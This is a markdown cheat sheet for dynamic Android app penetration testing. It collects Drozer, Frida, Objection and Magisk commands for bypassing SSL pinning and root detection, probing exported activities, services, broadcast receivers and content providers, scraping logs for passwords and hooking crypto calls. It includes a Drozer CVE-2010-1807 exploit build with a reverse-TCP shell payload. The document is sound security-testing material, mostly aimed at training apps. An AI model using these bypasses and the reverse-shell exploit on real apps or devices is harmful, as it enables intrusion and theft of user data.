# Dynamic Analysis
- OWASP checklist : https://mas.owasp.org/MAS_checklist/
- MindMap : https://dsopas.github.io/MindAPI/play/

## Tools
### Drozer
```bash
git clone https://github.com/FSecureLABS/drozer.git
cd drozer
make deb
# or :
wget https://github.com/WithSecureLabs/drozer/releases/download/2.4.4/drozer_2.4.4.deb
dpkg -i drozer_2.4.4.deb

# install drozer agent on device
wget https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk
adb install drozer-agent-2.3.4.apk

# open drozer agent app on device : turn it "on"
adb forward tcp:31415 tcp:31415

drozer console connect
```
#### Commands
https://gist.github.com/castexyz/2ef12840fccbf3b4ef7b6446d24a9352
```bash
# on drozer console
drozer console connect

'''
Info Gathering / Basics
'''
# list modules
list
# get packages list
run app.package.list -f $filter

# get basic info of package
run app.package.info -a $package_app

# dump androidmanifest.xml file
run app.package.manifest $package_app

# identify weaknesses
run app.package.attacksurface $package_app

# list exported activities / find private activities
run app.activity.info -a $package_app

# bypass exported activity


# launch activity
run app.activity.start --component $package_app $package_app.$activity

'''
Content providers
'''
# get infos about content providers
run app.provider.info -a $package_app
# content provider vulnerabilities
run scanner.provider.injection -a $package_app
run scanner.provider.traversal -a $package_app

# Database-backed Content Providers (Data Leakage)
run scanner.provider.finduris -a $package_app
# query accessible content URIs
run app.provider.query content://$content

# Database-backed Content Providers (SQLi)
run app.provider.query content://$accessible_content
--projection "'"
run app.provider.query content://$accessible_content
--selection "'"

'''
Services
'''
# list service
run app.service.info -a $package_app
# interact with service
# app.service.send 
# app.service.start  # Start Service                                       
# app.service.stop   # Stop Service
run app.service.send $package_app $ $package_app.$service --msg 2354 9234 1 --extra string $package_app.PIN 1337 --bundle-as-obj

'''
Broadcast Receivers
'''
# broadcast receivers
run app.broadcast.info # Detects all broadcast receivers on device
# check for app
run app.broadcast.info -a $package_app
# interactions
# app.broadcast.info          Get information about broadcast receivers           
# app.broadcast.send          Send broadcast using an intent                      
# app.broadcast.sniff         Register a broadcast receiver that can sniff particular intents
# i.e. : send SMS on app
run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message "Hello mate!"

'''
Debug
'''
# find debuggable apps
run app.package.debuggable

'''
Exploits / Shellcode
'''
# on host terminal
drozer exploit list
drozer shellcode list

# example : CVE-2010-1807
drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi  
--server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html
```

## Manual
### Disable SSL Pinning 
**Resources :**
- https://infosecwriteups.com/hail-frida-the-universal-ssl-pinning-bypass-for-android-e9e1d733d29
- https://kishorbalan.medium.com/its-all-about-android-ssl-pinning-bypass-and-intercepting-proxy-unaware-applications-91689c0763d8
- https://blog.certcube.com/android-ssl-pinng-bypass-with-frida/
#### Frida
```bash
'''
FRIDA SSL PINNING
'''
pip install frida-tools

# get android device architecture
getprop ro.product.cpu.abi

# get frida-server depending on the android device architecture
# https://github.com/frida/frida/releases
# extract it
adb push /path/to/frida-server /data/local/tmp

# Push the Burp Suite SSL certificate to the device
adb push /path/to/burpca-cert-der.crt /data/local/tmp/cert-der.crt

# Now we will need to make the server executable
adb shell “chmod 755 /data/local/tmp/frida-server”

# With the frida-server and certificate in place we need to execute it.
adb shell

# Once you have a shell switch to the root user of the device.
su

# Lastly, we will move to the correct folder and execute frida-server
cd /data/local/tmp
./frida-server

# SCRIPTS
# https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/
# https://codeshare.frida.re/@akabe1/frida-multiple-unpinning/
# https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
# https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/

# ON HOST
# hook the script using Frida using the command:
frida -U -f $package script.js
```

#### APK-MITM
```bash
'''
APK-MITM
'''
npm install -g apk-mitm
apk-mitm $apk
# reinstall the app
adb uninstall $package-app
adb install $apk_patched
```
#### Magisk - Move Certificates Module
**1. Download Magisk.apk** : https://github.com/topjohnwu/Magisk/releases
**2. Launch it in your device** : Allow SuperUser access
**3. Follow :** https://www.xda-developers.com/how-to-install-magisk/
**4. Enable MagiskHide :** Magisk App > Modules > Enable 'Move Certificates'

#### Objection
```bash
'''
OBJECTION
'''
pip3 install objection

# start frida server on android device
adb shell 
cd /data/local/tmp
./frida-server

# on host
objection -g “com.package.android” explore
android sslpinning disable
```

#### Modifying the network_security_config.xml file
>The Network Security Configuration lets apps customize their network security settings through _a declarative configuration file_. The entire configuration is contained within this XML file, and no code changes are required.
>The Network Security Configuration works in **Android 7.0 or higher.**
1. Decompile the android application with **apktool** : ```apktool d app.apk -o app-decompile```
2. Locate the **network_security_config.xml** file under **/res/xml**
3. Remove the ```<pin-set>...</pin-set>``` tag section and add :
```xml
<trust-anchors>
	<certificates src="user" />
	<certificates src="system" />
</trust-anchors>
```
4. Save the file and re-pack the application : ```apktool b app-decompile -o app-ssl.apk```
5. Sign the application (see '```## Decompile/Compile Source Code```)  

### Bypass Root Detection
**Resources :**
- https://redfoxsec.com/blog/android-root-detection-bypass-using-frida/
- https://kishorbalan.medium.com/my-fav-7-methods-for-bypassing-android-root-detection-f8afb0ddfaf3

#### Frida
```bash
'''
FRIDA
'''
# verify frida connection
frida-ls-devices

# find package name
frida-ps -Ua

# Take one script :
# https://codeshare.frida.re/@dzonerzy/fridantiroot/
# https://gist.githubusercontent.com/pich4ya/0b2a8592d3c8d5df9c34b8d185d2ea35/raw/db83ed8d4d3dfc29687724e4393e173362b1d7a9/root_bypass.js
# hook the script using Frida using the command:
frida -U -f $package frida-root.js
```
#### Objection
##### Common method
```bash
'''
OBJECTION
'''
pip3 install objection

# start frida server on android device
adb shell 
cd /data/local/tmp
./frida-server

objection -g “com.package.android” explore
android root disable
# else
android root simulate
```

##### Manual method
1. Convert the apk file into class files using **dex2jar**
2. Analyse the class files and identify which library is being used for the root detection (for example, de.cyberkatze.iroot)
3. Connect the app with objection : ```objection -g “com.package.android” explore```
4. Execute in objection : ```android hooking list class_methods <root detection class>```
		2. Change return value for the method in charge of Root Detection : ```android hooking set return_value <root_detect_class.method> false```
5. For *de.cyberkatze.iroot*, in objection :
	1. ```android hooking list class_methods de.cyberkatze.iroot.IRoot```
	2. Change return value for the method : ```android hooking set return_value de.cyberkatze.iroot.IRoot.isDeviceRooted false```

#### Tampering Smali Code
1. Decompile the apk file using **JADX-GUI** _or any other alternative._
2. Identify the code which is in charge of the root detection process
	1. If the library *rootbear* is used and there is an 'if' condition to verify if the device is rooted or not :
		1. Decompile the apk with **apktool** : ``apktool d app.apk -o app-decompile```
		2. Find the SMALI code for the 'if' statement (can look like this) : ```if-eqz v0, :cond_0```
		3. Change it by : ```if-nez v0, :cond_0```
		4. Save the file and rebuild the application : ```apktool b app-decompile -o app-root-patch.apk```
		5. Sign the application (see '```## Decompile/Compile Source Code```) 
		6. Re-install the application on the android device

#### Medusa Framework
https://github.com/Ch0pin/medusa
```bash
'''
MEDUSA
'''
git clone https://github.com/Ch0pin/medusa.git
cd medusa/
pip3 install -r requirements.txt
python3 medusa.py

# in medusa
search anti_debug
use helpers/anti_debug
compile
run -f $package_name
```

#### Magisk - MagiskHide
**1. Download Magisk.apk** : https://github.com/topjohnwu/Magisk/releases
**2. Launch it in your device** : Allow SuperUser access
**3. Follow :** https://www.xda-developers.com/how-to-install-magisk/
**4. Enable MagiskHide :** Magisk App > Settings > Magisk > Magisk Hide (enable)
**5. Choose the application in which we will hide the root** 

### Exported Activities / Service
In AndroidManifest.xml, check for exported activities :
```bash
cat AndroidManifest.xml | grep 'exported="true"'

# true : activity can be launched by any other applications.
# false : only the application can launch it.

# launch exported activity
adb shell am start -n $package_name/.$activity

# or drozer

```


#### Exploit Service
https://manifestsecurity.com/android-application-security-part-16/
>When a service is exported without any permission restriction, any application can bind to the service and access the function implemented in the service.

```bash
# start
adb shell am startservice app.beetlebug/app.beetlebug.handlers.VulnerableService
# stop
adb shell am force-stop app.beetlebug/app.beetlebug.handlers.VulnerableService
# status
dumpsys activity services $server_service
```

### Vulnerable Content Provider
https://redfoxsec.com/blog/exploiting-content-providers/
>A content provider component **supplies data from one application to others** on request. Such requests are handled by the methods of the ContentResolver class. A content provider can use different ways to store its data and the data can be **stored** in a **database**, in **files**, or even over a **network**.

```bash
cat AndroidManifest.xml | grep "<provider"
# search for :
# android:enabled="true"
# android:exported="true"
# check the permissions

# drozer console
run app.provider.info -a $package_app
# check source code for content providers URI

# query it :
run app.provider.query $content_provider_URI --vertical
```

### Insecure Logging
Sensitive information, (usernames, passwords, and other user data), is stored or printed in an insecure manner. This means that this information is easily accessible to anyone with access to the logs, which could potentially be a malicious actor who gains access to the device.

```bash
# make sure you installed frida
# find pid of app
frida-ps -Uai

# get logs of the app :
adb logcat --pid=2244

# find logged infos by the app when you log in, etc
adb logcat --pid=2244 | grep "password"
``` 

### Input Validation Issues
Input data from users, such as login credentials, user input, and other user-generated data, is not properly validated before being used by the application. 
**Check for :**
- SQLi
- XSS
- Code Injection
- BOF
- File Inclusion
- etc.

### Access Control Issues
Access controls, such as authentication and authorization mechanisms, are not properly implemented or enforced. This can lead to unauthorized access to sensitive information, data theft, and other security breaches.

**Try to access "sensitive" activities from outside the app :**
```bash
# list activities with adb
adb shell dumpsys package | grep -i ' + package.name + ' | grep Activity

# use adb
adb shell am start -n $app_name/.$activity

# Let’s try to access activity using content provider.
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes/

adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```

### Deep Link Exploitation
**What is it ?** https://developer.android.com/training/app-links/deep-linking
>Deep links are basically hyperlinks that allow users to directly open specific views inside an android application.
Examine the AndroidManifest.xml file and search for android:scheme attributes inside `<data>` tags to find the deep link defined.
- **Explanations** : 
	- https://justahmed.github.io/android/Allsafe-Walkthrough-Part-1/#8-deep-link-exploitation
	- https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-applications-basics#deep-links-url-schemes

```bash
cat AndroidManifest.xml | grep "<data"
# locate scheme, host and pathPrefix
# query
adb shell am start -a android.intent.action.VIEW -d "scheme://hostname/path?param=value" $package_name
```

### WebView Attacks
https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/webview-attacks

>WebView is a view that allows an application to load web pages within it. Internally it uses web rendering engines such as Webkit. The Webkit rendering engine was used prior to Android version 4.4 to load these web pages. On the latest versions (after 4.4) of Android, it is done using Chromium. When an application uses a WebView, it is run within the context of the application, which has loaded the WebView. To load external web pages from the Internet, the application requires INTERNET permission in its `AndroidManifest.xml` file:

```xml
<uses-permission android:name="android.permission.INTERNET"></uses-permission>
```
- **Accessing sensitive local resources through file scheme**
When an Android application uses a WebView with user controlled input values to load web pages, it is possible that users can also read files from the device in the context of the target application.

### Insecure Broadcast Receiver
>BroadcastReceiver is an android component that listens to system-wide broadcast events or intents. Examples of these broadcasts are when your phone’s battery is running low then a broadcast indicating the low battery condition is sent. Some apps could be configured to listen for this broadcast and lower its power consumption and maybe lower the brightness on your screen, etc…

#### Exploit
1. Examine AndroidManifest.xml
	1. Check for `<receiver>` tags
2. Check in the code where the broadcast receiver is, for the `onReceive`function and see how it handles broadcasts it receives.
3. Try to exploit it by sending customized notification


- **Exploiting** : https://resources.infosecinstitute.com/topic/android-hacking-security-part-3-exploiting-broadcast-receivers/

### Weak Cryptography
>Use frida to hook some encryption methods and obtain sensitive information like Encryption key, IV Encryption Algorithm, etc…

```bash
frida -U --codeshare fadeevab/intercept-android-apk-crypto-operations -f $package
```

### Object Deserialization
>Taking data structured in some format, and rebuilding it into an object.
- Explanations : https://justahmed.github.io/android/Allsafe-Walkthrough-Part-1/#14-object-serialization

### Insecure Providers
The goal is to assess the implementation and see if you can leak both info from the database and sensitive files accessed by the File Provider.
1. Check AndroidManifest.xml and search for `<provider>` tags
	1. For this provider :
```xml
<provider android:name="infosecadventures.allsafe.challenges.DataProvider" android:enabled="true" android:exported="true" android:authorities="infosecadventures.allsafe.dataprovider"/>
```
**It is exported, so easier. Query it :**
```bash
adb shell content query --uri "content://infosecadventures.allsafe.dataprovider"
```

## Burp Suite
### Certificate
https://portswigger.net/burp/documentation/desktop/mobile/config-android-device
1. Open Burp Suite go to the proxy tab. Then go to the Options tab click on "Import / export CA certificate"
2. Select Certificate in DER format
3. Push the certificate to your device adb push path/to/my/cert.der /data/local/tmp/cert-der.crt
4. You can also drag and drop it if you use and emulator

## PID Cat
>Tool showing log entries for a specific application package when debug=true in the app.
```bash
git clone https://github.com/JakeWharton/pidcat.git
cd pidcat
python pidcat.py $package_name
```

## Inspeckage
https://github.com/ac-pm/Inspeckage/releases
>**Information gathering**
>- Requested Permissions;
>- App Permissions;
>- Shared Libraries;
>- Exported and Non-exported Activities, Content Providers,Broadcast Receivers and Services;
>- Check if the app is debuggable or not;
>- Version, UID and GIDs;
>
>**Hooks**
*With the hooks, we can see what the application is doing in real time:*
>- Shared Preferences (log and file);
>- Serialization;
>- Crypto;
>- Hashes;
>- SQLite;
>- HTTP (an HTTP proxy tool is still the best alternative);
>- File System;
>- Miscellaneous (Clipboard, URL.Parse());
>- WebView;
>- IPC.
```bash
adb install mobi.acpm.inspeckage.apk
# go to the device : launch inspeckage
# open web browser : http://127.0.0.1:8008 on mobile
```